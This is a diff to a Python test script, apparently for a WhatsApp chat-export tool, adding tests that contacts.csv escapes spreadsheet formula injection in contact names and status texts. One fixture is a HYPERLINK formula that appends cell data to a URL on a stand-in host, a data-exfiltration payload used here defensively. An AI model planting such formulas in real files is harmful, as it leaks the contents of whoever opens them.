@@ -456,7 +456,7 @@ def _pb(field, payload):
 def _body(text):                       # top-level field 1 = this message; its field 1 = body
     return _pb(1, _pb(1, text.encode("utf-8")))
 for label, txt in [("a number someone sent", "1234567812345678"),
-                   ("a phone number as the whole message", "919876543210"),
+                   ("a phone number as the whole message", "155555501234"),
                    ("a pasted hex hash", "ae4f5d0932e7e10a8e4dfdbbe9bc7773dbbb5936ab25b310f8ceb44fe99f"),
                    ("an emoji newer than the interpreter's Unicode tables", "\U0001FAE9"),
                    ("text ending in new emoji", "Are.....\U0001FAE9\U0001FAE9\U0001FAE9"),
@@ -473,6 +473,28 @@ check("own and quoted stay apart", _WD.texts(q), ("reply", "*the quoted one*"))
 long_txt = "".join("A long forwarded notice, line %d.\n" % i for i in range(400))
 check("a long message is kept whole", _WD.texts(_body(long_txt))[0], long_txt)
 check("...and so is a long quote", _WD.texts(_pb(1, _pb(1, b"ok")) + _pb(2, _pb(1, long_txt.encode())))[1], long_txt)
+
+print("\ncontacts.csv: values a spreadsheet would run as a formula")
+# pushname and about are typed by the contacts themselves, and the window says contacts.csv opens in Excel
+import csv as _csv, tempfile as _tf
+_cs = {"contact": [
+    {"id": "15555550101@s.whatsapp.net", "pushname": '=HYPERLINK("http://example.invalid/?"&A1,"x")'},
+    {"id": "15555550102@s.whatsapp.net", "pushname": "-Raj-", "textStatusString": "@home"},
+    {"id": "15555550103@s.whatsapp.net", "pushname": "Plain Name", "textStatusString": "+ Hello"},
+    {"id": "15555550104@s.whatsapp.net", "pushname": "Ann", "textStatusLastUpdateTime": -1}]}
+_ids = Identities(_cs, {})
+_p = os.path.join(_tf.mkdtemp(), "contacts.csv")
+_WD.write_contacts_csv(_p, _ids)
+_rows = {r["jid"]: r for r in _csv.DictReader(open(_p, encoding="utf-8-sig", newline=""))}
+check("a formula in a pushname is written as text", _rows["15555550101@s.whatsapp.net"]["pushname"],
+      '\'=HYPERLINK("http://example.invalid/?"&A1,"x")')
+check("a name starting with '-' is text, not a formula", _rows["15555550102@s.whatsapp.net"]["pushname"], "'-Raj-")
+check("an about text starting with '@' too", _rows["15555550102@s.whatsapp.net"]["about"], "'@home")
+check("an about text starting with '+' too", _rows["15555550103@s.whatsapp.net"]["about"], "'+ Hello")
+check("an ordinary name is untouched", _rows["15555550103@s.whatsapp.net"]["pushname"], "Plain Name")
+check("a number stays a number", _rows["15555550104@s.whatsapp.net"]["about_updated"], "-1")
+check("identities.json keeps the value exactly as stored",
+      _ids.row("15555550102@s.whatsapp.net")["pushname"], "-Raj-")
 
 print()
 if FAIL:
